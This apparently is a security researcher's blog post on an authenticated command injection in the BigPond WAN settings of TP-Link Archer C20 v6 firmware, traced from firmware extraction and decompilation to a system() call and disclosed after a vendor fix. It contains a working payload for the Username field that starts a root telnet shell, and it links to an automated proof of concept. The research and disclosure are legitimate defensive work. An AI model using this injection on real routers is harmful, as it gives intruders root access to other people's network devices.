---
title: "BigPond Never Died: Authenticated Command Injection to Root in TP-Link's Legacy WAN Stack"
date: 2026-08-23 19:50:00 +0200
categories: [Vulnerability Research, Embedded Systems]
tags: [tp-link, firmware, command-injection, bigpond, embedded-linux]
description: "An obsolete ISP feature remained in Archer C20 v6 firmware and let BPA configuration reach a root shell through system()."
social_preview_image: https://totekuh.github.io/assets/img/archer-c20-v6-router.png
---

We bought an ordinary consumer router - a TP-Link Archer C20 v6 - and took it apart to look for bugs we could exploit. Nothing exotic: the kind of cheap box people put behind an ISP connection and forget about.

The plan was simple: inspect the firmware, map the exposed attack surface, and see what the vendor had left behind.

> **Disclosure note:** We reported this issue to TP-Link Product Security on 14 June 2026. TP-Link released fixed firmware and [published its advisory](https://www.tp-link.com/en/support/faq/5252/) on 19 August 2026; this write-up follows public remediation.

![TP-Link Archer C20 v6](/assets/img/archer-c20-v6-router.png)

*TP-Link Archer C20 v6.*

## Mapping the Target

You know the drill. Before trying to break anything, we need a map of the box: its firmware version, which processes started at boot, which services were exposed, and **where configuration data went after it left the web interface**.

We started with a full TCP scan:

```bash
witchtape@kraken:~$ nmap -p- -Pn -n 192.168.1.1
PORT      STATE SERVICE
80/tcp    open  http
1900/tcp  open  upnp
7547/tcp  open  cwmp
20001/tcp open  microsan
```

The HTTP administration panel confirmed the target and build under test. On first boot we set its administrative password to `Password123!`.

![TP-Link Archer C20 v6 status page showing firmware Build 251031](/assets/img/archer-web-panel-fw.png)

TP-Link still hosted the matching [`Archer C20(EU)_V6_251031` firmware](https://www.tp-link.com/nordic/support/download/archer-c20/v6/). We downloaded it and recorded the image digest:

```bash
witchtape@kraken:~/archer-251031$ sha256sum Archer_C20_EU_V6_251031.bin
6d94f0501831c25e7de4ffe7437fecde8df192a15da1378e7b120dd9d331b57b  Archer_C20_EU_V6_251031.bin
```

## Opening the Firmware

`file` identifies the image only as raw data, which is normal for vendor firmware. `binwalk` showed an LZMA kernel at `0x20400` and an XZ SquashFS filesystem at `0x160200`.

![Binwalk locating the bootloader, kernel, and SquashFS root filesystem](/assets/img/archer-binwalk-layout.png)

`binwalk` finds an LZMA kernel at `0x20400` and the XZ SquashFS root filesystem at `0x160200`; that rootfs is where the real work begins.

We extracted it as follows:

```bash
witchtape@kraken:~/archer-251031$ binwalk -e Archer_C20_EU_V6_251031.bin
```

The extracted root filesystem gave us the router's web panel, binaries, and shared libraries.

![Extracted Archer C20 root filesystem](/assets/img/archer-rootfs-listing.png)

## Tracing the BigPond Configuration

The WAN panel was the obvious place to start. BigPond was an Australian ISP brand operated by Telstra; TP-Link shipped a dedicated WAN mode for its broadband authentication protocol (BPA) years ago and never removed it. Selecting **BigPond Cable** exposes a legacy form with a username, password, authentication server, and authentication domain.

![BigPond Cable WAN configuration form](/assets/img/archer-bpa-wan-fields.png)

The page is `web/main/ethWan.htm`; its shared request code lives in `web/js/lib.js`. Both were minified, so we made readable working copies before tracing anything:

![Creating formatted copies of the WAN page and its JavaScript helper](/assets/img/archer-frontend-beautify.png)

The code does not spell out “BigPond.” The link comes from the frontend's string table: `bpa_cable` is the label rendered as **BigPond Cable**.

```javascript
bpa_cable: "BigPond Cable"
```

The WAN page uses that exact string key when it creates the option, while storing `bpa` as its internal value:

```javascript
if (INCLUDE_BPA) {
    option.value = "bpa";
    option.text = s_str.bpa_cable;
}
```

With that internal name, we searched the formatted page for its BPA configuration fields and save operation:

```bash
witchtape@kraken:~/archer-251031$ rg -n -C 4 \
  'X_TP_BpaEnable|X_TP_BpaAuthServer|ACT_SET,WAN_IP_CONN,bpaStk' \
  re/frontend/ethWan.pretty.htm
```

That search showed how BPA is represented in the configuration model. A `WAN_IP_CONN` object with `X_TP_BpaEnable == 1` is the BPA connection; its stack and current values become the `bpa` object used by the form:

```javascript
if (this.X_TP_BpaEnable == 1) {
    bpaStk = this.__stack;
    wan_bpa_list = $.act(ACT_GET, WAN_IP_CONN, this.__stack, null, null);
}
```

On Save, the page copies the user-controlled fields into that object and queues a set operation on the same `WAN_IP_CONN` instance:

```javascript
wan_bpa_listarg.X_TP_BpaAuthServer = $.id("bpa_authserver").value;
wan_bpa_listarg.X_TP_BpaAuthDomain = $.id("bpa_authdomain").value;

$.act(ACT_SET, WAN_IP_CONN, bpaStk, null, wan_bpa_listarg);
```

That was the useful discovery: **BigPond**, **BPA**, and `WAN_IP_CONN` were three names for the same feature at different layers.

## From the Panel to BPA Code

The JavaScript only stages a configuration object. We still needed the backend that consumes it, so we copied the router's web server into the reversing directory and bulk-decompiled it with [ghidra-decomp](https://github.com/totekuh/ghidra-decomp) into a searchable corpus:

```bash
witchtape@kraken:~/archer-251031$ cp \
  _Archer_C20_EU_V6_251031.bin.extracted/squashfs-root/usr/bin/httpd \
  re/httpd

witchtape@kraken:~/archer-251031$ ghidra-decomp re/httpd \
  -o re/httpd-decomp \
  --combined \
  --gzf \
  --workers 4 \
  --timeout 120 \
  --cache-dir re/ghidra-cache \
  --resume
```

The frontend had given us three useful anchors: `bpa`, `BigPond`, and `X_TP_Bpa`. We searched the decompiled server for them first:

```bash
witchtape@kraken:~/archer-251031$ rg -n -i 'bpa|bigpond|X_TP_Bpa' \
  re/httpd-decomp
```

There were no useful feature-specific hits. `httpd` was the generic request front end, so we enumerated every library in its `NEEDED` list and scanned each one for the frontend's BPA anchors:

![Scanning every httpd dependency for BPA-related strings](/assets/img/archer-httpd-needed-bpa-sweep.png)

Only `libcmm.so` contained BPA-related strings. We copied and bulk-decompiled that hit with [ghidra-decomp](https://github.com/totekuh/ghidra-decomp):

```bash
witchtape@kraken:~/archer-251031$ cp \
  _Archer_C20_EU_V6_251031.bin.extracted/squashfs-root/lib/libcmm.so \
  re/libcmm.so

witchtape@kraken:~/archer-251031$ ghidra-decomp re/libcmm.so \
  -o re/libcmm-decomp \
  --combined \
  --gzf \
  --workers 4 \
  --cache-dir re/libcmm-ghidra-cache \
  --resume
```

For longer functions, we kept the original Ghidra output as the source of record and generated a separate read-only review copy with [beautify_decomp.py](https://gist.github.com/totekuh/ad1666edb500f859cd6556a5eec4a88d).

The recovered exports then gave us function-level BPA anchors:

```bash
witchtape@kraken:~/archer-251031$ rg -n -i 'bpa' re/libcmm-decomp/exports.json
2195:    "name": "wan_conn_wanBpaConn_BpaInit",
3905:    "name": "wan_conn_bpaConn",
6047:    "name": "oal_wan_initBpa",
```

`oal_wan_initBpa()` was the function worth opening. It belongs to the BPA bring-up path, and its name makes the role clear before the decompiler has assigned a useful type to anything:

```bash
witchtape@kraken:~/archer-251031$ fd -t f -g '*oal_wan_initBpa.c' re/libcmm-decomp/functions
re/libcmm-decomp/functions/000ae450_7fe42d96ecd757d5d3fedfb5_oal_wan_initBpa.c

witchtape@kraken:~/archer-251031$ python3 re/beautify_decomp.py \
  re/libcmm-decomp/functions/000ae450_7fe42d96ecd757d5d3fedfb5_oal_wan_initBpa.c \
  -o re/oal_wan_initBpa.clean.c
```

The cleaned copy shows the BPA command buffer being assembled:

![Building the BPA startup command from configuration fields](/assets/img/archer-bpa-command-build.png)

The last field follows the same append pattern before the assembled command is passed to `util_execSystem()`:

![Passing the assembled BPA command to util_execSystem](/assets/img/archer-bpa-command-exec.png)

The first `snprintf` initializes `command`; each following block appends another value to that same buffer. The final call passes the completed buffer as the second argument to `util_execSystem()`. That `command` argument - not the surrounding pointer noise - is what we traced next.

The web form gave us a useful anchor: **Auth Server**. Rather than guess at the opaque string-table offsets, we searched `libcmm.so` for that label. It recovered the `authserver "%s"` fragment at `0xd6414`, matching the `+ 0x6414` format string used by the third command append:

![Finding the Auth Server command fragment in libcmm](/assets/img/archer-bpa-authserver-string.png)

The adjacent strings resolve the complete command template, in the same order that `oal_wan_initBpa()` builds it:

```text
bpalogin user %s password %s authserver "%s" authdomain "%s"
```

Note that `authserver` and `authdomain` are double-quoted in the template, but `user` and `password` are not - making those two fields the viable injection points.

![Resolving the BPA command fragments in libcmm](/assets/img/archer-bpa-command-strings.png)

## Following the Command String

The constructed string was not enough on its own. The remaining question was what `util_execSystem()` actually did with the assembled buffer, so we followed that call next:

```bash
witchtape@kraken:~/archer-251031$ fd -t f -g '*util_execSystem.c' \
  re/libcmm-decomp/functions
re/libcmm-decomp/functions/000a0b40_d1ab3f1c79ae0b2ef56d034a_util_execSystem.c

witchtape@kraken:~/archer-251031$ python3 re/beautify_decomp.py \
  re/libcmm-decomp/functions/000a0b40_d1ab3f1c79ae0b2ef56d034a_util_execSystem.c \
  -o re/util_execSystem.clean.c
```

The review copy closes the loop: `util_execSystem()` formats its second argument into a local `command` buffer, then calls `system(command)`.

![util_execSystem formatting the command argument and passing it to system](/assets/img/archer-util-execsystem-sink.png)

That gave us the primitive. The BPA form supplies values for the `WAN_IP_CONN` object; `oal_wan_initBpa()` inserts them into an unquoted `bpalogin user %s password %s ...` command; and `util_execSystem()` passes the completed buffer to the shell. The remaining question was whether the configuration validator would accept a shell metacharacter in one of those values.

The static path was complete. The remaining job was to validate it on the router.

## Live Validation

Before choosing a proof payload, we checked the extracted filesystem for a usable shell service:

![Finding the bundled telnetd binary in the extracted root filesystem](/assets/img/archer-telnetd-discovery.png)

We used the panel itself to submit the configuration. First, we used a harmless `;;;` probe to check the configuration validator's handling of shell separators:

![Probing the BPA username field with shell separators](/assets/img/archer-bpa-semicolon-probe.png)

We then used the compact payload below with the same mandatory placeholder values. `ash` is BusyBox's shell, and the shorter form stayed within the field validation limit:

```text
Username:    ;telnetd -l ash -p 2121;
Password:    w00t
Auth Server: 127.0.0.1
Auth Domain: w00t
```

We clicked Save and waited. The first connection attempt was refused; roughly two seconds later, once the BPA connection path had initialised, port `2121` accepted a connection and dropped us into the router's BusyBox shell:

![Submitting the compact BPA payload and connecting to the resulting shell](/assets/img/archer-bpa-live-shell.png)

The shell started at `/` with a root `#` prompt. The whole filesystem was now ours:

![Root BusyBox shell listing the router root filesystem](/assets/img/archer-bpa-root-shell.png)

## Reproducing the Chain

The panel test proved the primitive. For repeatable testing, [bpa-poc.py](https://github.com/totekuh/CVE-2026-75616/blob/master/bpa-poc.py) automates the same authenticated path: it logs in through `/cgi_gdpr`, finds the BPA `WAN_IP_CONN` instance, injects the username value, cycles BPA to `Connected`, and checks the listener. The PoC and usage instructions are in the [CVE-2026-75616 repository](https://github.com/totekuh/CVE-2026-75616).

This run shows the whole chain: refused port, authenticated configuration update, DHCP lease, BPA initialisation, open listener, and a shell with UID 0:

![Automated BPA proof of concept opening a root shell](/assets/img/archer-bpa-poc-root.png)

## Affected Versions

We confirmed the vulnerability on the TP-Link Archer C20 v6 running firmware Build 251031 (the latest available at the time of testing). The vulnerable `libcmm.so` library is shared across multiple Archer models; other devices carrying the same BPA code path in `oal_wan_initBpa()` may also be affected, but we did not test additional hardware.

TP-Link's [advisory](https://www.tp-link.com/en/support/faq/5252/) lists the EU fix as Build 260811. The US and RU fixes start at Build 260812. We tested only the EU build.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-06-14 | Vulnerability reported to TP-Link Product Security |
| 2026-08-19 | CVE-2026-75616 assigned; TP-Link security advisory released |
